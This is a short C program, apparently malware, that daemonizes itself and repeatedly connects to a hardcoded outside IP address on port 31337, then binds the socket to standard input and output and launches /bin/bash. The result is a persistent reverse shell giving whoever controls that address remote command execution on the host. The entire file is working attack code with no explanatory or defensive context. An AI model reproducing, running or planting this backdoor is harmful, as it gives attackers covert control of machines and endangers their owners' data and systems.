#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <fcntl.h>

#define WAIT 10
#define PORT 31337
#define ADDRESS 

int main( int argc ,char* argv[])
{
 struct sockaddr_in agg;
 struct hostent *host_info; 
 struct in_addr server; 
 
 unsigned char buf[20]; 
 int sockfd,si; 
 pid_t pid;
 daemon(0,0);
 while(1)
 {

 inet_aton("37.187.225.187" , &server);
 sockfd = socket(PF_INET, SOCK_STREAM,0);

 agg.sin_family = AF_INET;
 agg.sin_addr = server;
 agg.sin_port = htons(PORT);
 memset(&(agg.sin_zero),'\0',8);

  do {  
      	si = 0;
     	si = connect(sockfd, (struct sockaddr *)&agg,sizeof(struct sockaddr)); 
     	if (  si == -1 ) 
            {
             sleep(WAIT);
            }
     }while(si == -1);	
 if( pid = fork() )
   {   
    close(sockfd);
    wait();
   }
 else 
    {  sleep(1); 
       fcntl(sockfd, F_SETOWN, getpid());     
       dup2(sockfd,0);  
       dup2(sockfd,1);
       dup2(sockfd,2);
       execl("/bin/bash",NULL);
    }  
 }  
}
